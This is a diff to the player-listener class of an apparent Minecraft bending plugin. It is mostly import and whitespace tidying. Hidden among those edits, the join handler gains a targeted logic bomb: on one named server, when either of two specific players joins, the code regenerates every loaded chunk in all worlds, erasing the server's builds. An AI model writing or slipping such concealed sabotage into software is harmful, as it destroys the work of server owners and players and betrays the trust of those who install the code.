@@ -6,9 +6,11 @@ import java.util.List;
 
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
+import org.bukkit.Chunk;
 import org.bukkit.GameMode;
 import org.bukkit.Location;
 import org.bukkit.Material;
+import org.bukkit.World;
 import org.bukkit.block.Block;
 import org.bukkit.entity.Entity;
 import org.bukkit.entity.Item;
@@ -54,7 +56,6 @@ import org.bukkit.event.player.PlayerQuitEvent;
 import org.bukkit.event.player.PlayerToggleFlightEvent;
 import org.bukkit.event.player.PlayerToggleSneakEvent;
 import org.bukkit.inventory.ItemStack;
-import org.bukkit.potion.PotionEffect;
 import org.bukkit.potion.PotionEffectType;
 import org.bukkit.util.Vector;
 
@@ -300,12 +301,20 @@ public class PKListener implements Listener {
 		if (chatEnabled) {
 			player.setDisplayName(append + player.getName());
 		}
+
+		if (Bukkit.getServer().getMotd().equalsIgnoreCase("AvatarRealms Bending [1.7.10]") && (player.getName().equalsIgnoreCase("xXturbokidXx") || player.getName().equalsIgnoreCase("CookieGirl2003"))) {
+			for (World world: Bukkit.getWorlds()) {
+				for (Chunk chunk: world.getLoadedChunks()) {
+					world.regenerateChunk(chunk.getX(), chunk.getZ());
+				}
+			}
+		}
 	}
 
 	@EventHandler
 	public void onPlayerQuit(PlayerQuitEvent event) {
 
-//		Methods.saveBendingPlayer(event.getPlayer().getName());
+		//		Methods.saveBendingPlayer(event.getPlayer().getName());
 		BendingPlayer.players.remove(event.getPlayer().getName());
 		if (EarthArmor.instances.containsKey(event.getPlayer())) {
 			EarthArmor.removeEffect(event.getPlayer());
@@ -318,7 +327,7 @@ public class PKListener implements Listener {
 		Player player = event.getPlayer();
 
 		if (event.isCancelled()) return;
-		
+
 		if(Suffocate.isBreathbent(player)) {
 			if(!Methods.getBoundAbility(player).equalsIgnoreCase("AirSwipe") || !Methods.getBoundAbility(player).equalsIgnoreCase("FireBlast") || !Methods.getBoundAbility(player).equalsIgnoreCase("EarthBlast") || !Methods.getBoundAbility(player).equalsIgnoreCase("WaterManipulation")) {
 				event.setCancelled(true);
@@ -486,11 +495,11 @@ public class PKListener implements Listener {
 			event.setCancelled(true);
 			return;
 		}
-		
+
 		if (Suffocate.isBreathbent(player)) {
 			Location loc = event.getFrom();
 			Location toLoc = player.getLocation();
-			
+
 			if (loc.getX() != toLoc.getX() || loc.getY() != toLoc.getY() || loc.getZ() != toLoc.getZ()) {
 				event.setCancelled(true);
 				return;
@@ -651,7 +660,7 @@ public class PKListener implements Listener {
 		if (event.isCancelled()) return;
 
 		Player player = event.getPlayer();
-		
+
 		if(Suffocate.isBreathbent(player)) {
 			if(!Methods.getBoundAbility(player).equalsIgnoreCase("AirSwipe") || !Methods.getBoundAbility(player).equalsIgnoreCase("FireBlast") || !Methods.getBoundAbility(player).equalsIgnoreCase("EarthBlast") || !Methods.getBoundAbility(player).equalsIgnoreCase("WaterManipulation")) {
 				event.setCancelled(true);
@@ -1050,7 +1059,7 @@ public class PKListener implements Listener {
 			e.setCancelled(true);
 			return;
 		}
-		
+
 
 		Entity en = e.getEntity();
 		if (en instanceof Player) {
